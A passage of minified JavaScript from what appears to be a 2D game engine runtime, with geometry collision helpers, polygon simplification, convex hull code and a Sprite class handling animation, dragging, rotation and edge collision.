    var n = Object.setPrototypeOf || ({
        __proto__: []
    } instanceof Array ? function (t, e) {
        t.__proto__ = e;
    } : function (t, e) {
        for (var i in e) e.hasOwnProperty(i) && (t[i] = e[i]);
    });
    return function (t, e) {
        function i() {
            this.constructor = t;
        }
        n(t, e), t.prototype = null === e ? Object.create(e) : (i.prototype = e.prototype,
            new i());
    };
}(), _typeof = "function" == typeof Symbol && "symbol" === _typeof$1(Symbol.iterator) ? function (t) {
    return void 0 === t ? "undefined" : _typeof$1(t);
} : function (t) {
    return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : void 0 === t ? "undefined" : _typeof$1(t);
};

function Vec2(t, e) {
    t && "object" === (void 0 === t ? "undefined" : _typeof(t)) && (e = t.y, t = t.x),
        this.x = t || 0, this.y = e || 0;
}

var Intersection = {
    lineLine: lineLine,
    lineRect: lineRect,
    linePolygon: linePolygon,
    rectRect: rectRect,
    rectPolygon: rectPolygon,
    polygonPolygon: polygonPolygon,
    circleCircle: circleCircle,
    polygonCircle: polygonCircle,
    pointInPolygon: pointInPolygon,
    pointLineDistance: pointLineDistance,
    lineCircle: lineCircle
};

function lineLine(t, e, i, n) {
    var s = (n.x - i.x) * (t.y - i.y) - (n.y - i.y) * (t.x - i.x), r = (e.x - t.x) * (t.y - i.y) - (e.y - t.y) * (t.x - i.x);
    return 0 != (n = (n.y - i.y) * (e.x - t.x) - (n.x - i.x) * (e.y - t.y)) && (i = s / n,
        s = r / n, 0 <= i) && i <= 1 && 0 <= s && s <= 1 && {
        x: t.x + s * (e.x - t.x),
        y: t.y + i * (e.y - t.y)
    };
}

function lineRect(t, e, i) {
    var n = new Vec2(i.x, i.y), s = new Vec2(i.x, i.max_y), r = new Vec2(i.max_x, i.max_y), i = new Vec2(i.max_x, i.y);
    return lineLine(t, e, n, s) || lineLine(t, e, s, r) || lineLine(t, e, r, i) || lineLine(t, e, i, n) || !1;
}

function linePolygon(t, e, i) {
    for (var n = i.length, s = 0; s < n; ++s) {
        var r = lineLine(t, e, i[s], i[(s + 1) % n]);
        if (r) return r;
    }
    return !1;
}

function rectRect(t, e) {
    var i = t.x, n = t.y, s = t.x + t.width, t = t.y + t.height, r = e.x, a = e.y, o = e.x + e.width, e = e.y + e.height;
    return i <= o && r <= s && n <= e && a <= t;
}

function rectPolygon(t, e) {
    var i, n, s = new Vec2(t.x, t.y), r = new Vec2(t.x, t.yMax), a = new Vec2(t.xMax, t.yMax), o = new Vec2(t.xMax, t.y);
    if (linePolygon(s, r, e)) return !0;
    if (linePolygon(r, a, e)) return !0;
    if (linePolygon(a, o, e)) return !0;
    if (linePolygon(o, s, e)) return !0;
    for (i = 0, n = e.length; i < n; ++i) if (pointInPolygon(e[i], t)) return !0;
    return !!(pointInPolygon(s, e) || pointInPolygon(r, e) || pointInPolygon(a, e) || pointInPolygon(o, e));
}

function polygonPolygon(t, e) {
    for (var i = 0, n = t.length; i < n; ++i) {
        var s = linePolygon(t[i], t[(i + 1) % n], e);
        if (s) return s;
    }
    for (i = 0, n = e.length; i < n; ++i) {
        var r = pointInPolygon(e[i], t);
        if (r) return r;
    }
    for (i = 0, n = t.length; i < n; ++i) {
        var a = pointInPolygon(t[i], e);
        if (a) return a;
    }
    return !1;
}

function circleCircle(t, e) {
    return t.position.sub(e.position).mag() < t.radius + e.radius;
}

function polygonCircle(t, e) {
    var i = e.position, n = pointInPolygon(i, t);
    if (n) return n;
    for (var s = 0, r = t.length; s < r; s++) if (pointLineDistance(i, 0 === s ? t[t.length - 1] : t[s - 1], t[s], !0) < e.radius) return !0;
    return !1;
}

function lineCircle(t, e, i) {
    return pointLineDistance(i.position, t, e, !0) < i.radius;
}

function pointInPolygon(t, e) {
    for (var i = !1, n = t.x, s = t.y, r = e.length, a = 0, o = r - 1; a < r; o = a++) {
        var l = e[a].x, h = e[a].y, u = e[o].x, c = e[o].y;
        s < h != s < c && n < (u - l) * (s - h) / (c - h) + l && (i = !i);
    }
    return i;
}

function pointLineDistance(t, e, i, n) {
    var s = (a = i.x - e.x) * a + (o = i.y - e.y) * o, r = ((t.x - e.x) * a + (t.y - e.y) * o) / s, n = n ? !s || r < 0 ? e : 1 < r ? i : new Vec2(e.x + r * a, e.y + r * o) : new Vec2(e.x + r * a, e.y + r * o), a = t.x - n.x, o = t.y - n.y;
    return Math.sqrt(a * a + o * o);
}

function getSqDist(t, e) {
    var i = t.x - e.x;
    return i * i + (t = t.y - e.y) * t;
}

function getSqSegDist(t, e, i) {
    var n, s = e.x, e = e.y, r = i.x - s, a = i.y - e;
    return 0 == r && 0 == a || (1 < (n = ((t.x - s) * r + (t.y - e) * a) / (r * r + a * a)) ? (s = i.x,
        e = i.y) : 0 < n && (s += r * n, e += a * n)), (r = t.x - s) * r + (a = t.y - e) * a;
}

function simplifyRadialDist(t, e) {
    for (var i, n = t[0], s = [n], r = 1, a = t.length; r < a; r++) getSqDist(i = t[r], n) > e && (s.push(i),
        n = i);
    return n !== i && s.push(i), s;
}

function simplifyDPStep(t, e, i, n, s) {
    for (var r, a = n, o = e + 1; o < i; o++) {
        var l = getSqSegDist(t[o], t[e], t[i]);
        a < l && (r = o, a = l);
    }
    n < a && (1 < r - e && simplifyDPStep(t, e, r, n, s), s.push(t[r]), 1 < i - r) && simplifyDPStep(t, r, i, n, s);
}

function simplifyDouglasPeucker(t, e) {
    var i = t.length - 1, n = [t[0]];
    return simplifyDPStep(t, 0, i, e, n), n.push(t[i]), n;
}

function simplify(t, e, i) {
    return t.length <= 2 || (e = void 0 !== e ? e * e : 1, (t = simplifyDouglasPeucker(t = i ? t : simplifyRadialDist(t, e), e)).pop()),
        t;
}

function getOutline(t, e, i) {
    for (var n = [], s = 0; s < e; s++) for (var r = 0; r < i; r++) {
        var a = 4 * (s + r * e), o = 4 * (s + (r + 1) * e), l = 4 * (s + (r - 1) * e), h = a - 4, u = 4 + a;
        0 === t[3 + a] || 0 !== t[3 + o] && void 0 !== t[3 + o] && 0 !== t[3 + l] && void 0 !== t[3 + l] && 0 !== t[3 + h] && void 0 !== t[3 + h] && 0 !== t[3 + u] && void 0 !== t[3 + u] || n.push({
            x: s,
            y: r
        });
    }
    return n.length < 1 ? getImageRect(e, i) : n;
}

function getImageRect(t, e) {
    return [{
        x: 0,
        y: 0
    }, {
        x: t,
        y: 0
    }, {
        x: t,
        y: e
    }, {
        x: 0,
        y: e
    }];
}

function GeometryHelper() { }

function Coords(t, e) {
    this.x = t, this.y = e;
}

function insert(t, e, i) {
    t.splice(i, 0, e);
}

Coords.prototype.add = function (t) {
    return this.x += t.x, this.y += t.y, this;
}, Coords.prototype.angleInCycles = function () {
    var t = Math.atan2(this.y, this.x) / (2 * Math.PI);
    return t < 0 && (t += 1), t;
}, Coords.prototype.clone = function () {
    return new Coords(this.x, this.y);
}, Coords.prototype.dotProduct = function (t) {
    return this.x * t.x + this.y * t.y;
}, Coords.prototype.floor = function () {
    return this.x = Math.floor(this.x), this.y = Math.floor(this.y), this;
}, Coords.prototype.magnitude = function () {
    return Math.sqrt(this.x * this.x + this.y * this.y);
}, Coords.prototype.multiply = function (t) {
    return this.x *= t.x, this.y *= t.y, this;
}, Coords.prototype.overwriteWith = function (t) {
    return this.x = t.x, this.y = t.y, this;
}, Coords.prototype.randomize = function () {
    return this.x = Math.random(), this.y = Math.random(), this;
}, Coords.prototype.subtract = function (t) {
    return this.x -= t.x, this.y -= t.y, this;
}, Coords.prototype.toString = function () {
    return this.x + "," + this.y;
}, GeometryHelper.convexHullOfPoints = function (t, e) {
    for (var i = t.length, n = GeometryHelper.sortPoints(t)[0], s = [n], r = new Coords(), a = 0; n != s[0] || 1 == s.length;) {
        for (var o = Number.POSITIVE_INFINITY, l = null, h = 0; h < i; h++) {
            var u, c = t[h], p = (r.overwriteWith(c).subtract(n), r.magnitude());
            0 != p && ((u = r.angleInCycles() - a) < 0 && (u += 1), u <= o) && (u != o || p < r.overwriteWith(l).subtract(n).magnitude()) && (o = u,
                l = c);
        }
        n = l, s.push(n), a += o;
    }
    e = (e = e.length) < 1e4 ? 10 : 1e4 <= e && e < 5e4 ? 20 : 5e4 <= e && e < 1e5 ? 30 : 1e5 <= e && e < 2e5 ? 40 : 50;
    return 2e3 < t.length ? simplify(s, e) : simplify(s, e, !0);
}, GeometryHelper.sortPoints = function (t) {
    for (var e = [], i = 0; i < t.length; i++) {
        for (var n = t[i], s = 0; s < e.length; s++) {
            var r = e[s];
            if (n.y <= r.y) {
                if (n.y != r.y) break;
                if (n.x < r.x) break;
            }
        }
        insert(e, n, s);
    }
    return e;
};

var SpriteEvent$1 = function (t, e) {
    this.target = t, this.data = e;
}, SpriteModifiedEvent$1 = function (t) {
    function e() {
        return null !== t && t.apply(this, arguments) || this;
    }
    return _extends(e, t), e;
}(SpriteEvent$1), Sprite = function (t) {
    function a(t, e, i, n, s) {
        classCallCheck(this, a), (r = possibleConstructorReturn(this, e ? (a.__proto__ || Object.getPrototypeOf(a)).call(this, e) : (a.__proto__ || Object.getPrototypeOf(a)).call(this))).app = n;
        var r, n = getDeviceInfo().devicePixelRatio;
        return r.DEVICEPIXEL = n / 2, r.info = {
            realWidth: r.app.gameWidth,
            realHeight: r.app.gameHeight,
            gameWidth: r.app.gameWidth / 2,
            gameHeight: r.app.gameHeight / 2
        }, r.id = t, r._config = i, r.initConfig(), r.eventEmitter = getEventEmitter(),
            s || r.bindTouchEvent(), r._scale = e ? {
                x: (i.width || 0) / e.width,
                y: (i.height || 0) / e.height
            } : i.scale || {
                x: 1,
                y: 1
            }, r._physicsSystem = r.app.vm._physicsSystem, possibleConstructorReturn(r);
    }
    return inherits(a, t), createClass(a, [{
        key: "destroy",
        value: function (t) {
            this.app = null, this.info = null, this._config = null, this.eventEmitter = null,
                this._scale = null, this._physicsSystem = null, this.textureMap = null, this._body = null,
                this.points = null, this.aabb = null, this._outlineCollider = null, this._allCollisionPairs = null,
                this.parent && get(a.prototype.__proto__ || Object.getPrototypeOf(a.prototype), "destroy", this).call(this, !!t);
        }
    }, {
        key: "stopAnimation",
        value: function () {
            this.canDoAnimation = !1;
        }
    }, {
        key: "startAnimation",
        value: function () {
            this.currentFrameIndex = 0, this.setFrame(1), this.canDoAnimation = !0;
        }
    }, {
        key: "setAnimationLoop",
        value: function (t) {
            this.animationLoop = !!t;
        }
    }, {
        key: "setAnimationTotalTime",
        value: function (t) {
            this.loopTime = t || 1e3;
        }
    }, {
        key: "update",
        value: function (t) {
            this.aabb = null, this.points = null, this.bounds = null, this.drawCollider(this.currentFrameId),
                this.canDoAnimation && 0 < this.frames.length && (this.isAnimationing || (this._startAnimationTime = 0,
                    this._everyFrameTime = this.loopTime / this.frames.length, this.isAnimationing = !0),
                    this.doFrameAnimation(t));
        }
    }, {
        key: "doFrameAnimation",
        value: function (t) {
            this._startAnimationTime += 1e3 * t, this.animationLoop ? this._startAnimationTime >= this._everyFrameTime && (this._startAnimationTime = 0,
                this.nextFrame()) : (Math.floor(this._startAnimationTime / this._everyFrameTime) > this.currentFrameIndex && this.nextFrame(),
                    this.currentFrameIndex === this.frames.length - 1 && (this.canDoAnimation = !1,
                        this.isAnimationing = !1));
        }
    }, {
        key: "getBounds",
        value: function () {
            return this.bounds || (this.bounds = get(a.prototype.__proto__ || Object.getPrototypeOf(a.prototype), "getBounds", this).call(this)),
                this.bounds;
        }
    }, {
        key: "reset",
        value: function (t) {
            this.update(), this.noCollision = !1, this.initConfig(), this.resetFrame(), t && (this.id = t);
        }
    }, {
        key: "initConfig",
        value: function () {
            var t = void 0 === (t = (k = this._config).name) ? "" : t, e = void 0 === (e = k.scale) ? {
                x: 1,
                y: 1
            } : e, i = (k.rotation_type, k.rotation), n = void 0 === (n = k.dragMode) ? "none" : n, s = k.type, r = k.currentStyleId, a = void 0 === (a = k.pivot) ? {
                x: 0,
                y: 0
            } : a, o = (k.origin, k.x), l = k.y, h = void 0 === (h = k.width) ? 1 : h, u = void 0 === (u = k.height) ? 1 : u, c = k.mirror, p = k.visible, d = void 0 === (d = k.textureMap) ? {} : d, g = k.widgetModeH, f = k.widgetModeV, m = void 0 === (m = k.widgetH) ? 0 : m, y = void 0 === (y = k.widgetV) ? 0 : y, _ = k.blendMode, v = void 0 === (v = k.alpha) ? 1 : v, k = k.tint, t = (e.x || (e.x = 1),
                e.y || (e.y = 1), this.animationLoop = !1, this.loopTime = 1e3, this.isAnimationing = !1,
                this.canDoAnimation = !1, this.name = t, this.type = s, i / 180 * Math.PI || 0);
            this.rotation = t, this.rotationValue = t, this.faceRotationValue = 0, this.towardsRotationValue = 0,
                this.dragMode = n, this.dragging = !1, this.alpha = v, this.blendMode = _ || 0,
                "text" !== s && k && (this.tint = "0x" + k.slice(1, 7)), r && (this.currentStyleId = r),
                1 === g ? o = m * this.DEVICEPIXEL - this.info.gameWidth / this.app.stage.scale.x + h / 2 : 2 === g && (o = this.info.gameWidth / this.app.stage.scale.x - m * this.DEVICEPIXEL - h / 2),
                1 === f ? l = this.info.gameHeight / this.app.stage.scale.y - y * this.DEVICEPIXEL - u / 2 : 2 === f && (l = y * this.DEVICEPIXEL - this.info.gameHeight / this.app.stage.scale.y + u / 2),
                this.position.x = Strip(o) || 0, this.position.y = Strip(l) || 0, this.x = this.position.x || 0,
                this.y = -this.position.y || 0, "background" !== s && (this.setScale({
                    x: e.x,
                    y: e.y
                }), this.adjustPosition({
                    x: a.x / e.x,
                    y: a.y / e.y
                })), "background" === s || "variable" === s || "text" === s && !this._config.setSize || "container" === s || (h && (this.width = Strip(h)),
                    u && (this.height = Strip(u))), 3 === c ? (this.scale.y *= -1, this.scale.x *= -1) : 2 === c ? this.scale.y *= -1 : c && (this.scale.x *= -1),
                this.visible = !!p, this.interactive = !0, this.anchor.set(.5), this.textureMap = d,
                this.currentFrameIndex = 0, this.currentFrameId = this.currentStyleId && this.textureMap[this.currentStyleId] && this.textureMap[this.currentStyleId][0] && this.textureMap[this.currentStyleId][0].id;
        }
    }, {
        key: "setAlpha",
        value: function (t) {
            this.alpha = t;
        }
    }, {
        key: "show",
        value: function () {
            this.visible = !0, this._body && this._body.SetActive(!0);
        }
    }, {
        key: "hide",
        value: function () {
            this.visible = !1, this._body && this._body.SetActive(!1);
        }
    }, {
        key: "getPolygonByOutline",
        value: function (t) {
            return !t && this.points || (t = (this._config.outline || {}).points, this.points = this.transformPolygonOutline(t)),
                this.points;
        }
    }, {
        key: "getPolygon",
        value: function (t) {
            return !t && this.points || (t = (this.app.runtimeData.config.outlines || {})[this.currentFrameId] || this.app.loaderManager.imgOutlineData[this.currentFrameId],
                this.points = this.transformPolygon(t)), this.points;
        }
    }, {
        key: "getPolygonSecond",
        value: function (t) {
            return !t && this._points || (t = (this.app.runtimeData.config.outlines || {})[this.currentFrameId] || this.app.loaderManager.imgOutlineData[this.currentFrameId],
                this._points = this._transformPolygon(t)), this._points;
        }
    }, {
        key: "transformPolygonOutline",
        value: function (t) {
            var e, i, n, s, r, a, o, l, h = this;
            return this.texture ? (e = this._config.outline, i = e && e.width, n = e && e.height,
                r = s = void 0, "container" === this.type && (a = this.rotation, this.rotation = 0,
                    o = this.getAABB(), this.rotation = a, s = o.width, r = o.height), i || (n = "container" === this.type ? (i = s,
                        r) : (i = this.texture.width, this.texture.height)), t && 0 !== t.length || (t = getImageRect(i, n),
                            t = this.translateCoord(t)), l = [], this.calGlobalPosition(), t.forEach(function (t) {
                                t = {
                                    x: (t[0] - i / 2 + (e && e.x || 0)) * h.scale.x + h.globalPosition.x,
                                    y: (t[1] - n / 2 + (e && e.y || 0)) * h.scale.y + h.globalPosition.y
                                }, t = makePointRotate(h.globalPosition, t, h.rotation), t = h.adjustPositionByPoint(t),
                                    l.push(t);
                            }), l) : [];
        }
    }, {
        key: "transformPolygon",
        value: function (t) {
            var e, i, n, s, r, a, o = this;
            return this.texture ? (n = this.texture, e = n.width, i = n.height, "container" === this.type ? (n = this.rotation,
                this.rotation = 0, s = (r = this.getAABB()).width, r = r.height, this.rotation = n,
                t = getImageRect(e = s, i = r), t = this.translateCoord(t)) : t && 0 !== t.length || (t = getImageRect(e, i),
                    t = this.translateCoord(t)), a = [], this.calGlobalPosition(), t.forEach(function (t) {
                        t = {
                            x: (t[0] - e / 2) * o.scale.x + o.globalPosition.x,
                            y: (t[1] - i / 2) * o.scale.y + o.globalPosition.y
                        }, t = makePointRotate(o.globalPosition, t, o.rotation), t = o.adjustPositionByPoint(t),
                            a.push(t);
                    }), a) : [];
        }
    }, {
        key: "_transformPolygon",
        value: function (t) {
            var e, i, n, s, r, a = this;
            return this.texture ? (e = this.rotation, this.rotation = 0, i = "container" !== this.type ? this.texture : this.getAABB(),
                n = i.width, s = i.height, this.rotation = e, t && 0 !== t.length || (t = getImageRect(n, s),
                    t = this.translateCoord(t)), r = [], t.forEach(function (t) {
                        t = {
                            x: (t[0] - n / 2) * a.scale.x + a.position.x,
                            y: (t[1] - s / 2) * a.scale.y + a.position.y
                        }, t = makePointRotate(a.position, t, a.rotation), t = a.adjustPositionByPoint(t),
                            r.push(t);
                    }), r) : [];
        }
    }, {
        key: "translateCoord",
        value: function (t) {
            var e = [];
            return t.forEach(function (t) {
                e.push([t.x, t.y]);
            }), e;
        }
    }, {
        key: "adjustPosition",
        value: function (t) {
            var e = (i = makePointRotate({
                x: this.position.x,
                y: this.position.y
            }, {
                x: 0,
                y: 0
            }, this.rotationValue)).x, i = i.y;
            this.pivot.set(t.x, -t.y);
            var n = (t = makePointRotate({
                x: this.position.x,
                y: this.position.y
            }, {
                x: this.pivot.x * this.scale.x,
                y: this.pivot.y * this.scale.y
            }, this.rotationValue)).x, t = t.y;
            this.position.x += (n - e) * this.DEVICEPIXEL, this.position.y += (t - i) * this.DEVICEPIXEL;
        }
    }, {
        key: "adjustPositionByPoint",
        value: function (t) {
            var e = (i = makePointRotate({
                x: t.x,
                y: t.y
            }, {
                x: 0,
                y: 0
            }, this.rotationValue)).x, i = i.y, n = (s = makePointRotate({
                x: t.x,
                y: t.y
            }, {
                x: this.pivot.x * this.scale.x,
                y: this.pivot.y * this.scale.y
            }, this.rotationValue)).x, s = s.y;
            return t.x -= n - e, t.y -= s - i, t;
        }
    }, {
        key: "updateTexture",
        value: function (t, e) {
            var i;
            e = e || "1", t && t.baseTexture && ((i = this.scale).x, i.y, this.texture = t,
                "2" === e) && (this.width = t.width * this.DEVICEPIXEL, this.height = t.height * this.DEVICEPIXEL);
        }
    }, {
        key: "bindTouchEvent",
        value: function () {
            this.on("pointerdown", this.dragStart), this.on("pointerup", this.pointerUp), this.on("pointerupoutside", this.pointerUpOutside),
                this.on("pointermove", this.dragMove), this.on("pointerover", this.pointerOver),
                this.on("pointerout", this.pointerOut);
        }
    }, {
        key: "dragStart",
        value: function (t) {
            var e;
            this._currEventIdentifier = t.data.identifier, this.app.penetration || (this.mouse_down = !0,
                this.mouse_down_time = Date.now(), this._startPositionX = t.data.global.x, this._startPositionY = t.data.global.y,
                this.dragPointerPosition = t.data.getLocalPosition(this.parent), this.dragging = !0,
                e = new SpriteEvent$1(this, t), this.emit(EventType.pointerdown, e), this.eventEmitter.emit(EventType.pointerdown, null, e.target.id),
                this.eventEmitter.emit(EventType.press, e), this.scriptNode && this.scriptNode.onTouchStart && this.scriptNode.onTouchStart(t));
        }
    }, {
        key: "toggleEvent",
        value: function (t) {
            this.off("pointerdown", this.dragStart), this.off("pointerup", this.pointerUp),
                this.off("pointerupoutside", this.pointerUpOutside), this.off("pointermove", this.dragMove),
                this.off("pointerover", this.pointerOver), this.off("pointerout", this.pointerOut),
                this.interactive = !1, t && (this.interactive = !0, this.bindTouchEvent());
        }
    }, {
        key: "dragMove",
        value: function (t) {
            var e, i, n;
            this._currEventIdentifier !== t.data.identifier || this.app.penetration || this.dragging && "none" != this.dragMode && (e = t.data.getLocalPosition(this.parent),
                n = Sub(Math.round(100 * e.x) / 100, this.dragPointerPosition.x), i = Sub(Math.round(100 * e.y) / 100, this.dragPointerPosition.y),
                "_horizontal_" == this.dragMode ? this.position.x += n : ("_vertical_" != this.dragMode && (this.position.x += n),
                    this.position.y += i), this.dragPointerPosition = e, n = {
                        x: Math.round(this.position.x),
                        y: -Math.round(this.position.y),
                        id: this.id
                    }, this._body && this._physicsSystem.setPosition(this), this.emit(EventType.update, n),
                this.eventEmitter.emit(EventType.update, n), this.eventEmitter.emit(EventType.press, new SpriteEvent$1(this, t)),
                this.scriptNode) && this.scriptNode.onTouchMove && this.scriptNode.onTouchMove(t);
        }
    }, {
        key: "dragEnd",
        value: function () {
            this._currEventIdentifier = null, this.app.penetration || (this.dragging = !1, delete this.dragPointerPosition,
                this.eventEmitter.emit(EventType.modified, new SpriteModifiedEvent$1(this, {
                    property: "position",
                    value: {
                        x: this.position.x,
                        y: -this.position.y
                    }
                })));
        }
    }, {
        key: "setColor",
        value: function (t) {
            this.tint = t;
        }
    }, {
        key: "pointerUp",
        value: function (t) {
            var e, i;
            this._currEventIdentifier === t.data.identifier && (this._currEventIdentifier = null,
                !this.app.penetration || this.mouse_down) && (this.dragEnd(), this.mouse_down = !1,
                    e = new SpriteEvent$1(this, t), i = Math.pow(t.data.global.x - this._startPositionX, 2) + Math.pow(t.data.global.y - this._startPositionY, 2),
                    10 < Date.now() - this.mouse_down_time && Date.now() - this.mouse_down_time < 500 && i < 30 && (this.eventEmitter.emit(EventType.click, null, e.target.id),
                        this.emit(EventType.click, e), this.scriptNode && this.scriptNode.onClick && this.scriptNode.onClick(t),
                        this.__firstUptime && Date.now() - this.__firstUptime < 300 ? (this.__firstUptime = null,
                            this.eventEmitter.emit(EventType.dblclick, null, e.target.id)) : this.__firstUptime = Date.now()),
                    this.eventEmitter.emit(EventType.pointerup, e), this.emit(EventType.loose, e), this.eventEmitter.emit(EventType.loose, null, e.target.id));
        }
    }, {
        key: "pointerOut",
        value: function () {
            this.app.penetration || (this.cursor = "auto", this.mouse_down = !1);
        }
    }, {
        key: "pointerOver",
        value: function () { }
    }, {
        key: "pointerUpOutside",
        value: function (t) {
            this._currEventIdentifier === t.data.identifier && (this._currEventIdentifier = null,
                !this.app.penetration || this.mouse_down) && (this.dragEnd(), this.mouse_down = !1,
                    t = new SpriteEvent$1(this, t), this.eventEmitter.emit(EventType.pointerupoutside, t),
                    this.emit(EventType.loose, t), this.eventEmitter.emit(EventType.loose, null, t.target.id));
        }
    }, {
        key: "setX",
        value: function (t) {
            this.x = Strip(t), this.position.x = Strip(t);
        }
    }, {
        key: "setY",
        value: function (t) {
            this.y = -Strip(t), this.position.y = -Strip(t);
        }
    }, {
        key: "offsetXY",
        value: function (t, e) {
            null != t && this.setX(this.getX() + t), null != e && this.setY(this.getY() - e),
                this._body && (Performance.startPointToList("physic"), this._physicsSystem.setPosition(this),
                    Performance.endPointToList("physic"));
        }
    }, {
        key: "setPosition",
        value: function (t, e) {
            var i = this;
            null != t && this.setX(t), null != e && this.setY(e), this._body && (Performance.startPointToList("physic"),
                this._physicsSystem.setPosition(this), Performance.endPointToList("physic")), this.children && this.children.length && this.children.forEach(function (t) {
                    t._body && i._physicsSystem.setPosition(t);
                });
        }
    }, {
        key: "goTo",
        value: function (t, e) {
            this.setPosition(t, e);
        }
    }, {
        key: "calGlobalPosition",
        value: function () {
            this.globalPosition = this._scene.camera.parent.toWorld(this.getGlobalPosition());
        }
    }, {
        key: "getY",
        value: function (t) {
            return t ? (this.calGlobalPosition(), Math.round(100 * -this.globalPosition.y) / 100) : Math.round(100 * -this.y) / 100;
        }
    }, {
        key: "getX",
        value: function (t) {
            return t ? (this.calGlobalPosition(), Math.round(100 * this.globalPosition.x) / 100) : Math.round(100 * this.x) / 100;
        }
    }, {
        key: "goForward",
        value: function (t) {
            var e = this.getX(), i = this.getY(), e = e + Math.cos(this.towardsRotationValue) * t, i = i + Math.sin(this.towardsRotationValue) * t;
            return this.setPosition(e, i), {
                x: e,
                y: i
            };
        }
    }, {
        key: "getRotation",
        value: function () {
            return -this.rotation / Math.PI * 180;
        }
    }, {
        key: "rotateTo",
        value: function (t) {
            this.rotation < 0 && (this.rotation += 2 * Math.PI);
            var t = -t / 180 * Math.PI, e = this.rotationValue;
            this.rotationValue = t, this.rotation = t, this._body && this._physicsSystem.setRotation(this.id, t - e);
        }
    }, {
        key: "rotate",
        value: function (t) {
            return this.rotation < 0 && (this.rotation += 2 * Math.PI), t = -t / 180 * Math.PI,
                this.rotationValue = this.rotationValue + t, this.rotation = this.rotationValue,
                this._body && this._physicsSystem.setRotation(this.id, t), this.rotation;
        }
    }, {
        key: "getTowardsRotation",
        value: function () {
            return this.towardsRotationValue / Math.PI * 180;
        }
    }, {
        key: "getFaceRotation",
        value: function () {
            return -this.faceRotationValue / Math.PI * 180;
        }
    }, {
        key: "towardsTo",
        value: function (t) {
            this.towardsRotationValue = -t / 180 * Math.PI;
        }
    }, {
        key: "faceTo",
        value: function (t) {
            this.faceRotationValue = -t / 180 * Math.PI, this.rotation = this.faceRotationValue + this.rotationValue;
        }
    }, {
        key: "setScale",
        value: function (t) {
            this.scale.set(t.x, t.y), this.position.x += this.pivot.x * (this.scale.x - 1),
                this.position.y += this.pivot.y * (this.scale.y - 1), this.x = this.position.x,
                this.y = this.position.y, this._body && this._physicsSystem.setScale(this.id);
        }
    }, {
        key: "setOneScale",
        value: function (t, e) {
            this.scale[t] = e, this.position[t] += this.pivot[t] * (this.scale[t] - 1), this[t] = this.position[t],
                this._body && this._physicsSystem.setScale(this.id);
        }
    }, {
        key: "setPivot",
        value: function (t) {
            var e = t.x, t = t.y;
            this.pivot.x = e, this.pivot.y = t, this.adjustPosition({
                x: e,
                y: t
            });
        }
    }, {
        key: "getCircle",
        value: function () {
            var t = this.width;
            return "container" === this.type && (t = this.getAABB().width), Math.min(this.scale.x, t / this._config.width),
            {
                position: new LB.MathUtil.Vec2(this.gPostion.x + this._config.outline.x * this.scale.x, -this.gPostion.y + this._config.outline.y * this.scale.y),
                radius: this._config.outline.radius * this.scale.x * ("container" == this.type ? this.DEVICEPIXEL : 1)
            };
        }
    }, {
        key: "getRect",
        value: function () {
            var t = this.width / this._config.width, t = Math.min(this.scale.x, t), e = this.height / this._config.height, e = Math.min(this.scale.y, e);
            return {
                x: this.position.x,
                y: this.position.y,
                width: this._config.outline.width * t,
                height: this._config.outline.height * e
            };
        }
    }, {
        key: "getRectPoints",
        value: function () {
            return this.transformPolygonOutline();
        }
    }, {
        key: "getAABB",
        value: function () {
            var t, e, i, n;
            return this.aabb || ((t = this.getBounds()).width = t.width - 2, t.height = t.height - 2,
                n = (i = this.app).gameHeight, i.gameWidth, e = (i = i.stage.scale).x, (i = i.y) < e ? (t.height /= i,
                    t.y = n / 2 + sprite.y - t.height / 2) : e < i && (n = t.width, t.width /= e, t.x = t.x - (t.width - n) / 2),
                this.aabb = t), this.aabb;
        }
    }, {
        key: "checkOutOfBoundary",
        value: function (t) {
            var e = 1 < arguments.length && void 0 !== arguments[1] && arguments[1];
            if (!this.visible) return !1;
            var i = this.getAABB(), n = i.x, s = i.y, r = i.width, a = i.height, o = (i = this.info).realWidth, l = i.realHeight, h = !1;
            switch (t) {
                case "screen_left":
                    h = n + r < 0;
                    break;

                case "screen_right":
                    h = o < n;
                    break;

                case "screen_top":
                    h = s + a < 0;
                    break;

                case "screen_bottom":
                    h = l < s;
                    break;

                default:
                    h = n + r < 0 || o < n || s + a < 0 || l < s;
            }
            return h && e && this.eventEmitter.emit(VMEventType.moveout, null, null, this.id, t),
                h;
        }
    }, {
        key: "checkCollisionOfEdge",
        value: function (t, e) {
            if (!this.visible || this.noCollision) return !1;
            var i = this.getPolygonByOutline(), n = this._config.outline && this._config.outline.type;
            if (!(i = "circle" === n ? this.getCircle() : i)) return !1;
            var s = this.info.realWidth / 2 / this.app.stage.scale.x, r = this.info.realHeight / 2 / this.app.stage.scale.y, a = {
                x: -s,
                y: r
            }, o = {
                x: -s,
                y: -r
            }, l = {
                x: s,
                y: r
            }, h = {
                x: s,
                y: -r
            }, u = "circle" === n ? Intersection.lineCircle : Intersection.linePolygon, c = !1;
            switch (t) {
                case "_left_edge_":
                    c = u(a, o, i);
                    break;

                case "_right_edge_":
                    c = u(l, h, i);
                    break;

                case "_top_edge_":
                    c = u(h, o, i);
                    break;

                case "_bottom_edge_":
                    c = u(l, a, i);
                    break;

                case "_edge_":
                    c = u(l, a, i) || u(a, o, i) || u(l, h, i) || u(h, o, i);
            }
            return c && e && this.eventEmitter.emit(VMEventType.collision, null, null, this.id, t),
                c;
        }
    }, {
        key: "getLocalPosition",
        value: function (t) {
            var e = this.x - this.pivot.x * this.scale.x, i = this.y - this.pivot.y * this.scale.y, t = makePointRotate(this.position, t, -this.rotation), e = 0 < this.scale.x ? t.x - e + this.width / 2 : t.x - e - this.width / 2, t = 0 < this.scale.y ? t.y - i + this.height / 2 : t.y - i - this.height / 2;
            return {
                x: Math.round(e / this.scale.x),
                y: Math.round(t / this.scale.y)
            };
        }
    }, {
        key: "changeAnchor",
        value: function (t, e) {
            return function () { };
        }
    }, {
        key: "bounceOfEdge",
        value: function (t) {
            var e = Math.cos(this.towardsRotationValue), i = Math.sin(this.towardsRotationValue);
            switch (t) {
                case "_left_edge_":
                    this.checkCollisionOfEdge(t) && (e = Math.abs(e));
                    break;

                case "_right_edge_":
                    this.checkCollisionOfEdge(t) && (e = -Math.abs(e));
                    break;

                case "_top_edge_":
                    this.checkCollisionOfEdge(t) && (i = -Math.abs(i));
                    break;

                case "_bottom_edge_":
                    this.checkCollisionOfEdge(t) && (i = Math.abs(i));
                    break;

                default:
                    this.checkCollisionOfEdge("_left_edge_") && (e = Math.abs(e)), this.checkCollisionOfEdge("_right_edge_") && (e = -Math.abs(e)),
